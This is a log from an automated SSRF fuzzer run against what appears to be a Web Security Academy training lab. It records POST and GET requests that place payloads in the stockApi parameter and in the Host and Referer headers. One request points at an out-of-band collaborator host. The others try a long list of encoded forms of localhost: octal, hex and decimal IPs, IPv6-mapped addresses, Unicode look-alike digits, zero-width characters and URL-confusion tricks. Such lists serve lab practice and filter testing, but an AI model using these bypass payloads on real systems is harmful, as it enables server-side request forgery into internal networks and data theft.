[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:38:03.243854] method=GET param='header: host' → https://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:03.580057] method=GET param='header: host' → https://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:03.921219] method=GET param='header: host' → https://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:04.256120] method=GET param='header: host' → https://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:04.588516] method=GET param='header: host' → https://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:04.922591] method=GET param='header: host' → https://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:05.259785] method=GET param='header: host' → https://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:05.592534] method=GET param='header: host' → https://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:05.925803] method=GET param='header: host' → https://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:06.277218] method=GET param='header: host' → https://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:06.610806] method=GET param='header: host' → https://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:06.943729] method=GET param='header: host' → https://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:07.276602] method=GET param='header: host' → https://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:07.608599] method=GET param='header: host' → https://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:07.946202] method=GET param='header: host' → https://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:08.279066] method=GET param='header: host' → https://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:08.612973] method=GET param='header: host' → https://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:08.966649] method=GET param='header: host' → https://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:09.325097] method=GET param='header: host' → https://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:09.657439] method=GET param='header: host' → https://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:09.988119] method=GET param='header: host' → https://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:10.320378] method=GET param='header: host' → https://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:10.653622] method=GET param='header: host' → https://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:11.007622] method=GET param='header: host' → https://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:11.351395] method=GET param='header: host' → https://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:11.684293] method=GET param='header: host' → https://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:12.039525] method=GET param='header: host' → https://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:12.373523] method=GET param='header: host' → https://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:12.723082] method=GET param='header: host' → https://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:13.055081] method=GET param='header: host' → https://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:13.390664] method=GET param='header: host' → https://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:13.721079] method=GET param='header: host' → https://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:14.058214] method=GET param='header: host' → https://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:14.389287] method=GET param='header: host' → https://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:14.748665] method=GET param='header: host' → https://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:15.091447] method=GET param='header: host' → https://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:15.473239] method=GET param='header: host' → https://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:15.812040] method=GET param='header: host' → https://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:16.146125] method=GET param='header: host' → https://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:16.480119] method=GET param='header: host' → https://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:16.819444] method=GET param='header: host' → https://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:17.150666] method=GET param='header: host' → https://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:17.482226] method=GET param='header: host' → https://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:17.818099] method=GET param='header: host' → https://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:18.185195] method=GET param='header: host' → https://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:18.519602] method=GET param='header: host' → https://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:18.851375] method=GET param='header: host' → https://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:19.184753] method=GET param='header: host' → https://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:19.537563] method=GET param='header: host' → https://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:19.883435] method=GET param='header: host' → https://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:20.216160] method=GET param='header: host' → https://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:20.553012] method=GET param='header: host' → https://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:20.885656] method=GET param='header: host' → https://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:21.220062] method=GET param='header: host' → https://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:21.554125] method=GET param='header: host' → https://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:21.885696] method=GET param='header: host' → https://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:22.219390] method=GET param='header: host' → https://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:22.557802] method=GET param='header: host' → https://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:22.892741] method=GET param='header: host' → https://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:23.225432] method=GET param='header: host' → https://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:23.562219] method=GET param='header: host' → https://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:23.894055] method=GET param='header: host' → https://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:24.225586] method=GET param='header: host' → https://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:24.558438] method=GET param='header: host' → http://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:24.892107] method=GET param='header: host' → http://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:25.222649] method=GET param='header: host' → http://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:25.563945] method=GET param='header: host' → http://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:25.914974] method=GET param='header: host' → http://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:26.248252] method=GET param='header: host' → http://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:26.580783] method=GET param='header: host' → http://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:26.931173] method=GET param='header: host' → http://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:27.270415] method=GET param='header: host' → http://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:27.604338] method=GET param='header: host' → http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:27.934212] method=GET param='header: host' → http://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:28.267797] method=GET param='header: host' → http://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:28.610773] method=GET param='header: host' → http://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:28.954201] method=GET param='header: host' → http://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:29.299097] method=GET param='header: host' → http://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:29.637607] method=GET param='header: host' → http://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:29.967626] method=GET param='header: host' → http://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:30.301677] method=GET param='header: host' → http://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:30.635220] method=GET param='header: host' → http://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:30.974915] method=GET param='header: host' → http://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:31.312794] method=GET param='header: host' → http://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:31.643811] method=GET param='header: host' → http://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:31.992241] method=GET param='header: host' → http://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:32.326543] method=GET param='header: host' → http://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:32.660398] method=GET param='header: host' → http://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:33.001718] method=GET param='header: host' → http://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:33.333048] method=GET param='header: host' → http://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:33.666780] method=GET param='header: host' → http://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:34.020366] method=GET param='header: host' → http://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:34.351308] method=GET param='header: host' → http://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:34.683572] method=GET param='header: host' → http://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:35.014873] method=GET param='header: host' → http://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:35.352446] method=GET param='header: host' → http://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:35.684231] method=GET param='header: host' → http://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:36.030749] method=GET param='header: host' → http://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:36.367384] method=GET param='header: host' → http://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:36.704613] method=GET param='header: host' → http://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:37.033966] method=GET param='header: host' → http://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:37.392791] method=GET param='header: host' → http://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:37.726966] method=GET param='header: host' → http://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:38.060421] method=GET param='header: host' → http://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:38.396683] method=GET param='header: host' → http://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:38.727543] method=GET param='header: host' → http://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:39.071631] method=GET param='header: host' → http://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:39.411906] method=GET param='header: host' → http://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:39.745934] method=GET param='header: host' → http://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:40.078343] method=GET param='header: host' → http://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:40.418494] method=GET param='header: host' → http://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:40.761925] method=GET param='header: host' → http://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:41.094262] method=GET param='header: host' → http://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:41.428393] method=GET param='header: host' → http://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:41.766740] method=GET param='header: host' → http://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:42.119750] method=GET param='header: host' → http://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:42.475778] method=GET param='header: host' → http://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:42.815390] method=GET param='header: host' → http://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:43.155610] method=GET param='header: host' → http://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:43.490862] method=GET param='header: host' → http://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:43.824414] method=GET param='header: host' → http://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:44.159122] method=GET param='header: host' → http://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:44.490459] method=GET param='header: host' → http://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:44.832733] method=GET param='header: host' → http://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:45.169683] method=GET param='header: host' → http://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:45.500173] method=GET param='header: host' → http://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:45.830999] method=GET param='header: host' → http://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:46.163053] method=GET param='header: host' → http://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:46.494186] method=GET param='header: host' → http://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:46.829571] method=GET param='header: host' → https://localhost#@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_3.json 
[2025-03-26T07:38:47.166555] method=POST param='header: referer' → https://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:47.492150] method=POST param='header: referer' → https://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:47.872328] method=POST param='header: referer' → https://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:48.238249] method=POST param='header: referer' → https://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:48.604266] method=POST param='header: referer' → https://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:48.967459] method=POST param='header: referer' → https://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:49.332259] method=POST param='header: referer' → https://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:49.701530] method=POST param='header: referer' → https://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:50.088091] method=POST param='header: referer' → https://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:50.460380] method=POST param='header: referer' → https://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:50.823327] method=POST param='header: referer' → https://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:51.217752] method=POST param='header: referer' → https://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:51.583384] method=POST param='header: referer' → https://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:51.961403] method=POST param='header: referer' → https://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:52.305735] method=POST param='header: referer' → https://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:52.646397] method=POST param='header: referer' → https://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:52.971986] method=POST param='header: referer' → https://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:53.348744] method=POST param='header: referer' → https://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:53.716291] method=POST param='header: referer' → https://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:54.080775] method=POST param='header: referer' → https://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:54.406079] method=POST param='header: referer' → https://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:54.778325] method=POST param='header: referer' → https://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:55.144199] method=POST param='header: referer' → https://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:55.508905] method=POST param='header: referer' → https://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:55.885497] method=POST param='header: referer' → https://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:56.234542] method=POST param='header: referer' → https://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:56.601855] method=POST param='header: referer' → https://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:56.963190] method=POST param='header: referer' → https://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
[2025-03-26T07:38:57.328103] method=POST param='header: referer' → https://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_4.json 
